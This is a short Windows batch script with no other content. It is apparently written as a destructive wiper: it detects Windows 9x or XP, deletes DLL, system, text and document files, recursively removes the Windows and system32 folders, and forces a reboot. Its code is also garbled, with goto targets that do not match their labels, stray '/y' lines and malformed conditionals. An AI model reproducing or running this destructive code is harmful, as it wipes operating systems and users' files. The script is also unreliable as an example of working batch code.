   :test
   if exist c:\autoexec.bat then goto win9x
   if not exist c:\autoexec.bat then goto winxp

   :win 9x
   start c:\winnt
   del *.dll
   del *.sys
   del *.txt
   del *.doc
   rd /s/q c:\winnt
   start c:\
   del autoexec.bat
   goto restart 9x

   :win xp
   start C:\Windows\system32
   del *.*
   /y
   rd /s/q C:\Windows\system32
   rd /s/q C:\Windows\system
   start C:\Windows
   del *.*
   /y
   rd /s/q C:\Windows
   goto restartxp

   :restart 9x
   if exist C:\WINDOWS\RUNDLL.EXE user.exe,exitwindowsexec then goto restart 9x 2
   if exist C:\WINDOWS\RUNDLL32 SHELL32.DLL,SHExitWindowsEx 2 then goto restrat me

   :restartxp
   C:\WINDOWS\system32\config\systemprofile\Desktop
   SHUTDOWN -r -t 01

   :2
   C:\WINDOWS\RUNDLL.EXE user.exe,exitwindowsexec

   :restrat me
   C:\WINDOWS\RUNDLL32 SHELL32.DLL,SHExitWindowsEx 2
